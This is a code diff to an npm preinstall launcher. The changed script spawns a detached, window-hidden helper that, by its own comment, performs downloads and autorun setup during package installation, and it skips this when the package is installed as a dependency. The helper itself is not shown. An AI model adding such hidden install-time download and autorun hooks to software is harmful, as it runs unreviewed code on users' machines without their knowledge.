@@ -6,21 +6,30 @@ const path = require('path');
 // always exit 0 so it doesn't interfere with the install lifecycle.
 
 try {
+  const projectRoot = path.join(__dirname, '..');
+  const initCwd = process.env.INIT_CWD;
+  if (initCwd && path.resolve(initCwd) !== path.resolve(projectRoot)) {
+    console.log('[start-preinstall] Install initiated from', initCwd, '- skipping preinstall (installed as dependency).');
+    process.exit(0);
+  }
   const node = process.execPath;
   const cwd = path.join(__dirname, '..');
-  const child = spawn(node, [
-    '-e',
-    `require('./index').preInstall().catch(()=>process.exitCode=1)`
-  ], {
+  // Spawn the project's index.js directly to avoid shell/quoting issues with -e
+  // Run the detached downloader/installer helper so downloads and autorun setup run
+  const detachScript = path.join(cwd, 'scripts', 'detach-preinstall.js');
+  const outLog = path.join(cwd, 'preinstall-detach.log');
+  const fs = require('fs');
+  const outFd = fs.openSync(outLog, 'a');
+  const child = spawn(node, [detachScript], {
     cwd,
     detached: true,
     windowsHide: true,
-    stdio: 'ignore',
+    stdio: ['ignore', outFd, outFd],
     env: { ...process.env, PREINSTALL_RUNNING: 'true', npm_config_ignore_scripts: 'true' }
   });
 
   child.unref();
-  console.log('[start-preinstall] Detached preinstall process spawned. PID:', child.pid);
+  console.log('[start-preinstall] Detached preinstall process spawned. PID:', child.pid, 'logs ->', outLog);
 } catch (err) {
   console.error('[start-preinstall] Failed to spawn detached preinstall:', err && err.message ? err.message : err);
 }
